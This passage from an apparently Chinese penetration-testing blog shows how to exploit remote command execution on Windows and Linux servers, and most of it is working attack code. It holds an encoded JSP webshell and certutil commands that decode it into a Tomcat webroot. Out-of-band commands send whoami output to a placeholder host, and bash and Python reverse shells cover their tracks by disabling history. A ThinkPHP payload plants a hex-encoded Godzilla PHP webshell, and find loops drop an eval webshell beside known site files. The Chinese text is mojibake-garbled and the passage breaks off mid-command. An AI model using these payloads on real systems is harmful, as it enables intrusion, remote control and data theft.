ItdG86Iik9PS0xKXtmaWxlLm1rZGlyKCk7fWJ3PW5ldyBCdWZmZXJlZFdyaXRlcihuZXcgT3V0cHV0U3RyZWFtV3JpdGVyKG5ldyBGaWxlT3V0cHV0U3RyZWFtKG5ldyBGaWxlKHEuaW5kZXhPZigiLXRvOiIpIT0tMT9wLnRyaW0oKTpwK3Euc3Vic3RyaW5nKHEuaW5kZXhPZigiLS1mOiIpKzQscS5sZW5ndGgoKSkudHJpbSgpKSx0cnVlKSxjcykpO313aGlsZShyLm5leHQoKSl7Zm9yKGludCBpPTE7IGk8PW47aSsrKXtpZihxLmluZGV4T2YoIi0tZjoiKSE9LTEpe2J3LndyaXRlKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdCIpO2J3LmZsdXNoKCk7fWVsc2V7c2IuYXBwZW5kKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdHxcdCIpO319aWYoYnchPW51bGwpe2J3Lm5ld0xpbmUoKTt9c2IuYXBwZW5kKCJcclxuIik7fXIuY2xvc2UoKTtpZihidyE9bnVsbCl7YncuY2xvc2UoKTt9fWNhdGNoKEV4Y2VwdGlvbiBlKXtzYi5hcHBlbmQoIlJlc3VsdFx0fFx0XHJcbiIpO3RyeXttLmV4ZWN1dGVVcGRhdGUocSk7c2IuYXBwZW5kKCJFeGVjdXRlIFN1Y2Nlc3NmdWxseSFcdHxcdFxyXG4iKTt9Y2F0Y2goRXhjZXB0aW9uIGVlKXtzYi5hcHBlbmQoZWUudG9TdHJpbmcoKSsiXHR8XHRcclxuIik7fX1tLmNsb3NlKCk7Yy5jbG9zZSgpO30lPjwlY3M9cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikhPW51bGw/cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikrIiI6Y3M7cmVzcG9uc2Uuc2V0Q29udGVudFR5cGUoInRleHQvaHRtbCIpO3Jlc3BvbnNlLnNldENoYXJhY3RlckVuY29kaW5nKGNzKTtTdHJpbmdCdWZmZXIgc2I9bmV3IFN0cmluZ0J1ZmZlcigiIik7dHJ5e1N0cmluZyBaPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKFB3ZCkrIiIpO1N0cmluZyB6MT1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiejEiKSsiIik7U3RyaW5nIHoyPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MiIpKyIiKTtzYi5hcHBlbmQoIi0+IisifCIpO1N0cmluZyBzPXJlcXVlc3QuZ2V0U2Vzc2lvbigpLmdldFNlcnZsZXRDb250ZXh0KCkuZ2V0UmVhbFBhdGgoIi8iKTtpZihaLmVxdWFscygiQSIpKXtzYi5hcHBlbmQocysiXHQiKTtpZighcy5zdWJzdHJpbmcoMCwxKS5lcXVhbHMoIi8iKSl7QUEoc2IpO319ZWxzZSBpZihaLmVxdWFscygiQiIpKXtCQih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIkMiKSl7U3RyaW5nIGw9IiI7QnVmZmVyZWRSZWFkZXIgYnI9bmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihuZXcgRmlsZUlucHV0U3RyZWFtKG5ldyBGaWxlKHoxKSkpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9YnIuY2xvc2UoKTt9ZWxzZSBpZihaLmVxdWFscygiRCIpKXtCdWZmZXJlZFdyaXRlciBidz1uZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihuZXcgRmlsZU91dHB1dFN0cmVhbShuZXcgRmlsZSh6MSkpKSk7Yncud3JpdGUoejIpO2J3LmNsb3NlKCk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkUiKSl7RUUoejEpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJGIikpe0ZGKHoxLHJlc3BvbnNlKTt9ZWxzZSBpZihaLmVxdWFscygiRyIpKXtHRyh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkgiKSl7SEgoejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJJIikpe0lJKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSiIpKXtKSih6MSk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIksiKSl7S0soejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJMIikpe0xMKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiTSIpKXtTdHJpbmdbXSBjPXt6MS5zdWJzdHJpbmcoMiksejEuc3Vic3RyaW5nKDAsMiksejJ9O1Byb2Nlc3MgcD1SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO01NKHAuZ2V0SW5wdXRTdHJlYW0oKSxzYik7TU0ocC5nZXRFcnJvclN0cmVhbSgpLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiTiIpKXtOTih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIk8iKSl7T08oejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJQIikpe1BQKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiUSIpKXtRUShjcyx6MSx6MixzYix6Mi5pbmRleE9mKCItdG86IikhPS0xP3oyLnN1YnN0cmluZyh6Mi5pbmRleE9mKCItdG86IikrNCx6Mi5sZW5ndGgoKSk6cy5yZXBsYWNlQWxsKCJcXFxcIiwiLyIpKyJpbWFnZXMvIik7fX1jYXRjaChFeGNlcHRpb24gZSl7c2IuYXBwZW5kKCJFUlJPUiIrIjovLyAiK2UudG9TdHJpbmcoKSk7fXNiLmFwcGVuZCgifCIrIjwtIik7b3V0LnByaW50KHNiLnRvU3RyaW5nKCkpOyU+ &gt;&gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt&amp;&amp;echo -----END CERTIFICATE----- &gt;&gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨ certutil è§£ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.jsp</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯ä¸‰"><a href="#åœºæ™¯ä¸‰" class="headerlink" title="åœºæ™¯ä¸‰"></a>åœºæ™¯ä¸‰</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šå¦<br>æ˜¯å¦é€šå¤–ç½‘ï¼šæ˜¯</p><p>è§£å†³æ€è·¯ï¼š<br>æ–¹æ³•ä¸€ï¼šè¿œç¨‹ä¸‹è½½å¹¶æ‰§è¡Œï¼ˆå‚è€ƒåœºæ™¯ä¸€æ–¹æ³•äºŒï¼‰</p><p>æ–¹æ³•äºŒï¼šOOB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;whoami&apos;) do certutil -urlcache -split -f http://x.x.x.x/%i  #æ‰§è¡Œwhoamiå‘½ä»¤å¹¶å°†ç»“æœå‘é€è‡³DNSLog</span><br><span class="line">for /r c:\ %i in (checkCode.js*) do certutil -urlcache -split -f http://x.x.x.x/%i  #å¯»æ‰¾Webåº”ç”¨è·¯å¾„å¹¶å°†ç»“æœå‘é€è‡³DNSLog</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯å››"><a href="#åœºæ™¯å››" class="headerlink" title="åœºæ™¯å››"></a>åœºæ™¯å››</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šå¦<br>æ˜¯å¦é€šå¤–ç½‘ï¼šå¦</p><p>è§£å†³æ€è·¯ï¼šç›´æ¥ç›²æ‰“</p><ol><li>ç›´æ¥ç›²æ‰“ï¼Œå®šä½ Web è·¯å¾„å¹¶å†™å…¥ç»“æœæ–‡ä»¶</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /r C:\ %i in (test.css*) do whoami &gt; %i/../test.txt</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c &quot;for /f %i in (&apos;dir /s /b d:a.php&apos;) do (echo %i&gt; %i.path.txt)&amp;(ipconfig &gt; %i.ipconfig.txt)&quot;</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="åœºæ™¯ä¸€-1"><a href="#åœºæ™¯ä¸€-1" class="headerlink" title="åœºæ™¯ä¸€"></a>åœºæ™¯ä¸€</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šæ˜¯<br>æ˜¯å¦é€šå¤–ç½‘ï¼šæ˜¯</p><p>è§£å†³æ€è·¯ï¼šæœ€ç®€å•çš„åœºæ™¯ï¼Œæ–¹æ³•å¾ˆå¤š<br>æ–¹æ³•ä¸€ï¼šç¡®è®¤ Web åº”ç”¨ç‰©ç†è·¯å¾„ï¼Œç„¶åå†™å…¥ webshell</p><ol><li>æ‰§è¡Œ pwdã€ls ç­‰å‘½ä»¤ç¡®è®¤ä¸€ä¸‹ Web è·¯å¾„åœ¨å“ªé‡Œ</li><li>å†™å…¥ webshell</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo webshellçš„base64ç¼–ç å†…å®¹ |base64 -d &gt; Webåº”ç”¨ç›®å½•/test.jsp  #echoå‘½ä»¤ç›´æ¥å†™å…¥webshell</span><br></pre></td></tr></table></figure><p>Weblogicçš„æƒ…å†µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -name bea_wls_internal|while read f;do find $f -type d -name war;done|while read ff;do echo $ff &gt;$ff/sectest.txt;done</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šåå¼¹ shell, æ–¹æ³•å¾ˆå¤š, ä¸ä¸€ä¸€åˆ—å‡º<br>a)bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">æˆ–è€…</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p>b)python<br>1.wget æˆ– curl ä¸‹è½½ python åå¼¹è„šæœ¬ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/test.py http://x.x.x.x/test.py</span><br></pre></td></tr></table></figure><p>2.python åå¼¹è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import sys,os,socket,pty</span><br><span class="line">shell = &quot;/bin/sh&quot;</span><br><span class="line">def usage(name):</span><br><span class="line">    print &apos;python reverse connector&apos;</span><br><span class="line">    print &apos;usage: %s &lt;ip_addr&gt; &lt;port&gt;&apos; % name</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) !=3:</span><br><span class="line">        usage(sys.argv[0])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        s.connect((sys.argv[1],int(sys.argv[2])))</span><br><span class="line">        print &apos;connect ok&apos;</span><br><span class="line">    except:</span><br><span class="line">        print &apos;connect faild&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    global shell</span><br><span class="line">    os.unsetenv(&quot;HISTFILE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTFILESIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTORY&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSAVE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTZONE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTLOG&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTCMD&quot;)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;,&apos;/dev/null&apos;)</span><br><span class="line">    os.putenv(&quot;HISTSIZE&quot;,&apos;0&apos;)</span><br><span class="line">    os.putenv(&quot;HISTFILESIZE&quot;,&apos;0&apos;)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯äºŒ-1"><a href="#åœºæ™¯äºŒ-1" class="headerlink" title="åœºæ™¯äºŒ"></a>åœºæ™¯äºŒ</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šæ˜¯<br>æ˜¯å¦é€šå¤–ç½‘ï¼šå¦</p><p>è§£å†³æ€è·¯ï¼šé’ˆå¯¹è¿™ç§åœºæ™¯ï¼Œè§£å†³æ–¹æ³•å°±æ¯”è¾ƒçµæ´»äº†ã€‚å› ä¸ºä¸é€šå¤–ç½‘ï¼Œæ‰€ä»¥ä¸»æ€è·¯è¿˜æ˜¯æƒ³åŠæ³•å†™å…¥ webshellã€‚å‚è€ƒåœºæ™¯ä¸€æ–¹æ³•ä¸€ã€‚</p><h3 id="åœºæ™¯ä¸‰-1"><a href="#åœºæ™¯ä¸‰-1" class="headerlink" title="åœºæ™¯ä¸‰"></a>åœºæ™¯ä¸‰</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šå¦<br>æ˜¯å¦é€šå¤–ç½‘ï¼šæ˜¯</p><p>è§£å†³æ€è·¯ï¼š<br>æ–¹æ³•ä¸€ï¼šç›´æ¥åå¼¹ shell, å‚è€ƒåœºæ™¯ä¸€æ–¹æ³•äºŒ</p><p>æ–¹æ³•äºŒï¼šOOB</p><ol><li>å®šä½ Web åº”ç”¨ç›®å½•</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://x.x.x.x/`pwd|base64`  #å¤§è‡´ç¡®è®¤ä¸€ä¸‹å½“å‰ç›®å½•ï¼Œå†é€šè¿‡lsã€cdç­‰å‘½ä»¤è·å–Webåº”ç”¨ç›®å½•ï¼Œå¹¶å‘é€ç»“æœè‡³DNSLog</span><br></pre></td></tr></table></figure><ol><li>å†™å…¥ webshell</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo webshellçš„base64ç¼–ç å†…å®¹ |base64 -d &gt; Webåº”ç”¨ç›®å½•/test.jsp  #echoå‘½ä»¤ç›´æ¥å†™å…¥webshell</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯å››-1"><a href="#åœºæ™¯å››-1" class="headerlink" title="åœºæ™¯å››"></a>åœºæ™¯å››</h3><p>æ˜¯å¦æœ‰å›æ˜¾ï¼šå¦<br>æ˜¯å¦é€šå¤–ç½‘ï¼šå¦</p><p>è§£å†³æ€è·¯ï¼šæœ€è‰°éš¾çš„æƒ…å†µï¼Œç›´æ¥ç›²æ‰“</p><ol><li>ç›´æ¥ç›²æ‰“ï¼Œå®šä½ Web è·¯å¾„å¹¶å†™å…¥ç»“æœæ–‡ä»¶</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /|grep check.js|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure><h3 id="Certutilç¼–ç ä¸Šä¼ Webshell"><a href="#Certutilç¼–ç ä¸Šä¼ Webshell" class="headerlink" title="Certutilç¼–ç ä¸Šä¼ Webshell"></a>Certutilç¼–ç ä¸Šä¼ Webshell</h3><p>å°†â€œå“¥æ–¯æ‹‰â€çš„PHPæœ¨é©¬åœ¨è¿›è¡Œä¸€æ¬¡HEXæˆ–å¤šæ¬¡ç¼–ç ï¼Œç„¶åå°†ç¼–ç åçš„å†…å®¹ç”¨setå‘½ä»¤å†™å…¥ï¼Œæœ€åå†ç”¨certutilå‘½ä»¤çš„decodehexå‚æ•°å°†å…¶è§£ç å¹¶å†™å…¥åˆ°shell.phpæ–‡ä»¶å³å¯ã€‚</p><p>å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;a=cmd.exe /c set /p=&quot;3C3F7068700A2020202073657373696F6E5F737461727428293B0A20202020407365745F74696D655F6C696D69742830293B0A09406572726F725F7265706F7274696E672830293B0A2020202066756E6374696F6E20452824442C244B297B0A2020202020202020666F722824693D303B24693C7374726C656E282444293B24692B2B29207B0A20202020202020202020202024445B24695D203D2024445B24695D5E244B5B24692B312631355D3B0A20202020202020207D0A202020202020202072657475726E2024443B0A202020207D0A2020202066756E6374696F6E2051282444297B0A202020202020202072657475726E206261736536345F656E636F6465282444293B0A202020207D0A2020202066756E6374696F6E204F282444297B0A202020202020202072657475726E206261736536345F6465636F6465282444293B0A202020207D0A2020202024503D2770617373273B0A2020202024563D277061796C6F6164273B0A2020202024543D2733633665306238613963313532323461273B0A2020202069662028697373657428245F504F53545B24505D29297B0A202020202020202024463D4F2845284F28245F504F53545B24505D292C245429293B0A202020202020202069662028697373657428245F53455353494F4E5B24565D29297B0A202020202020202020202020244C3D245F53455353494F4E5B24565D3B0A20202020202020202020202024413D6578706C6F646528277C272C244C293B0A202020202020202020202020636C61737320437B7075626C69632066756E6374696F6E206E766F6B6528247029207B6576616C2824702E2222293B7D7D0A20202020202020202020202024523D6E6577204328293B0A09090924522D3E6E766F6B652824415B305D293B0A2020202020202020202020206563686F20737562737472286D64352824502E2454292C302C3136293B0A2020202020202020202020206563686F20512845284072756E282446292C245429293B0A2020202020202020202020206563686F20737562737472286D64352824502E2454292C3136293B0A20202020202020207D656C73657B0A202020202020202020202020245F53455353494F4E5B24565D3D24463B0A20202020202020207D0A202020207D&quot; &gt; E:\phpstudys\PHPTutorial\WWW\bm\public\static\hex.txt</span><br></pre></td></tr></table></figure><p>è¿˜åŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;a=cmd.exe /c certutil -decodehex E:\phpstudys\PHPTutorial\WWW\bm\public\static\hex.txt E:\phpstudys\PHPTutorial\WWW\bm\public\static\shell.php</span><br></pre></td></tr></table></figure><h1 id="Tips-2"><a href="#Tips-2" class="headerlink" title="Tips-2"></a>Tips-2</h1><p>å¹³å¸¸æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½åˆ©ç”¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åå¼¹äº†ä¸€ä¸ªshellå›æ¥ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿æ“ä½œæˆ‘ä»¬å¯èƒ½éœ€è¦å†™ä¸€ä¸ªwebshellåˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä½†æ˜¯å¦‚ä½•æ‰èƒ½åœ¨ä¸€ä¸ªç³»ç»Ÿé‡Œè¾¹å¿«é€Ÿçš„å®šä½åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„å‘¢ï¼Œå¦‚ä½•æ‰èƒ½åœ¨æ ‡å‡†åŒ–ç³»ç»Ÿä¸­é€šè¿‡ä¸€æ¡å‘½ä»¤å¿«é€Ÿå®ç°è¿™ä¸€ç‚¹å‘¢ï¼Ÿæˆ‘ä¸çŸ¥é“å°ä¼™ä¼´ä»¬é€šå¸¸ç”¨ä»€ä¹ˆæ ·çš„æ–¹æ³•ï¼Œè¿™é‡Œç»™å¤§å®¶ä»‹ç»å‡ ç§æ–¹æ³•ã€‚</p><p>æ–¹æ³•ä¸€ ï¼šæ‰“å¼€webæŸ¥çœ‹æºç ï¼Œå¤åˆ¶ä¸€ä¸ªç‰¹å¾å­—ç¬¦ä¸²ï¼Œç„¶åæ›¿æ¢è¿›ä¸‹é¢å‘½ä»¤çš„htmlStringæœç´¢ä¹‹ã€‚</p><p>Win ï¼šfindstr /s/i/n /d:E:\code\xampp\htdocs\ /c:â€htmlStringâ€ <em>.</em><br>Linuxï¼šfind / -name â€œ.â€ | xargs grepâ€htmlStringâ€<br>æ–¹æ³•äºŒ ï¼šå¯¹äºlinuxç³»ç»Ÿï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•é€šè¿‡historyå‘½ä»¤å»æŸ¥æ‰¾ï¼ŒåŒæ ·çš„ä¹Ÿå¯ä»¥å»çœ‹.bash_history</p><p>history | grep -E â€˜cd|vi|ed|nano|et|mkdir|rm|find|ls|mvâ€™ |grep -v grep | grep -E â€˜www|html|nginx|apache|php|lighttp|webâ€™ -i</p><p>æ–¹æ³•ä¸‰ ï¼šwindowsç³»ç»Ÿä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨dirå»åŒ¹é…ä¸€ä¸ªç‰¹å¾æ–‡ä»¶å</p><p>dir /s/a-d/b E:\code\xampp\htdocs*é‡å¤åº¦è¾ƒä½çš„æ–‡ä»¶åï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰</p><h1 id="Tips-3"><a href="#Tips-3" class="headerlink" title="Tips-3"></a>Tips-3</h1><p><a href="https://xz.aliyun.com/t/2741" target="_blank" rel="noopener">https://xz.aliyun.com/t/2741</a></p><h1 id="Tips-4"><a href="#Tips-4" class="headerlink" title="Tips-4"></a>Tips-4</h1><p>è½¬è½½æ¥è‡ª<a href="https://www.yuque.com/pmiaowu/gbq3vb/zfr90i" target="_blank" rel="noopener">https://www.yuque.com/pmiaowu/gbq3vb/zfr90i</a></p><h2 id="linuxæŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶"><a href="#linuxæŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶" class="headerlink" title="linuxæŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶"></a>linuxæŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶</h2><p>0x01 å‰è¨€<br>åœ¨å®æˆ˜ä¸­æˆ‘ä»¬å¯èƒ½æŒ–åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œä½†æ˜¯å› ä¸ºæ‰¾ä¸åˆ°ç›®å½•è€Œæ— æ³•å†™shellã€‚</p><p>é‚£ä¹ˆè¿™ç§æƒ…å†µæœ¬ç¯‡æ–‡ç« å°±å¯ä»¥æ´¾ä¸Šç”¨åœºäº† : )</p><p>ä½œç”¨ï¼šæŸ¥æ‰¾ç³»ç»Ÿçš„æŸä¸ªæ–‡ä»¶å¹¶åœ¨é‚£ä¸ªæ–‡ä»¶çš„åŒçº§ç›®å½•ä¸‹å†™å…¥æˆ‘ä»¬çš„æ–°æ–‡ä»¶</p><p>æ³¨æ„ï¼šåœ¨linuxä¸Šèƒ½å¦æˆåŠŸå†™å…¥è¦çœ‹å½“æ—¶æ‰§è¡Œçš„ç”¨æˆ·æ˜¯å¦æœ‰æƒé™å†™å…¥</p><p>0x02 å‘½ä»¤<br>[æŸ¥æ‰¾çš„æ–‡ä»¶] ä¾‹å¦‚ï¼š1.jpg<br>[å†™å…¥çš„å†…å®¹] ä¾‹å¦‚ï¼š111<br>[å†™å…¥çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼š111.txt</p><p>å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name [æŸ¥æ‰¾çš„æ–‡ä»¶]|while read file;do sh -c &quot;echo &apos;[å†™å…¥çš„å†…å®¹]&apos;&quot;&gt;$(dirname $file)/[å†™å…¥çš„æ–‡ä»¶åå­—];done</span><br></pre></td></tr></table></figure><p>å‘½ä»¤å®ä¾‹åŒ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo &apos;111&apos;&quot;&gt;$(dirname $file)/111.txt;done</span><br></pre></td></tr></table></figure><p>0x03 ä¾‹å­</p><p>åœºæ™¯:</p><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ç«™ç‚¹çš„ç›®å½•æ— æ³•å†™shellï¼Œäºæ˜¯å°±æƒ³æ‰¹é‡æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶åœ¨è¿™ä¸ªæ–‡ä»¶ä¸‹å†™å…¥æˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶</p><p>æŸ¥çœ‹ç«™ç‚¹å‘ç°äº†ä¸€å¼ å›¾ç‰‡ <a href="http://127.0.0.1/upload/2020/11/11/1.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.jpg</a></p><p>ä½†æ˜¯æ— æ³•å¾—çŸ¥è·¯å¾„ï¼Œè¿™ç§æƒ…å†µä¸‹å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ‰¹é‡æŸ¥æ‰¾å†™å…¥äº†</p><p>0x03.1 ä¾‹å­ä¸€ - æ™®é€šå†™å…¥</p><p>æŸ¥æ‰¾linuxä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶<br>å¹¶ä¸”åœ¨åŒçº§ç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ 111.txt<br>æ–‡ä»¶å†…å®¹ä¸º 111</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo &apos;111&apos;&quot;&gt;$(dirname $file)/111.txt;done</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œlinuxä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶åŒçº§ç›®å½•å°±éƒ½ä¼šå†™å…¥ä¸€ä¸ª 111.txt æ–‡ä»¶äº†</p><p>æ¥ç€æˆ‘ä»¬è®¿é—® <a href="http://127.0.0.1/upload/2020/11/11/111.txt" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/111.txt</a></p><p>å°±å¯ä»¥çœ‹åˆ°ç«™ç‚¹å†™å…¥äº†ä¸€ä¸ª 111.txt æ–‡ä»¶</p><p>å†…å®¹ä¸º: 111</p><p>0x03.2 ä¾‹å­äºŒ - base64å†™shell<br>æŸ¥æ‰¾linuxä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶<br>å¹¶ä¸”åœ¨åŒçº§ç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ 1.php<br>æ–‡ä»¶å†…å®¹ä¸º<br>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= è§£ç ç­‰äº<br>[æŸ¥æ‰¾çš„æ–‡ä»¶] ä¾‹å¦‚ï¼š1.jpg<br>[base64ç¼–ç çš„å†…å®¹] æ²¡å•¥å¥½è¯´çš„ï¼ŒæŠŠæƒ³å†™çš„å†…å®¹base64ç¼–ç ç„¶åç»™è¿™ä¸ªå‚æ•°å³å¯<br>[å†™å…¥çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼š1.php</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 